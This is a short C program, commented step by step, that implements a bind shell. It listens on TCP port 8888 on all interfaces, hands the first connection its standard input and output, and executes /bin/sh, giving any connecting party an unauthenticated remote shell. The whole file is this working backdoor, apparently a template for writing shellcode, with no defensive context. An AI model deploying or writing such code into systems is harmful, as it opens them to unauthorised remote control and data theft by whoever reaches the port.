#include <stdio.h>
#include <netinet/in.h>
#include <unistd.h>

int main() {
    int s, c;
    struct sockaddr_in addr;

    //// Step 1: Create socket
    //// AF_INET = 2
    //// SOCK_STREAM = 1
    s = socket(AF_INET, SOCK_STREAM, 0);

    //// Step 2: Bind
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8888); //port to bind to, default is 8888
    addr.sin_addr.s_addr = INADDR_ANY; //bind to 0.0.0.0. [INADDR_ANY] = 0
    bind(s, (struct sockaddr*)&addr, sizeof(addr)); //sizeof(addr) is 16 bytes

    //// Step 3: Listen
    listen(s, 0);

    //// Step 4: Accept connections
    c = accept(s, NULL, NULL);

    //// Step 5: Redirect stdin, stdout and stderr to socket
    dup2(c, STDERR_FILENO);
    dup2(c, STDOUT_FILENO);
    dup2(c, STDIN_FILENO);

    //// Step 6: Execute "/bin/sh"
    execve("/bin/sh", NULL, NULL);

    return 0;
}

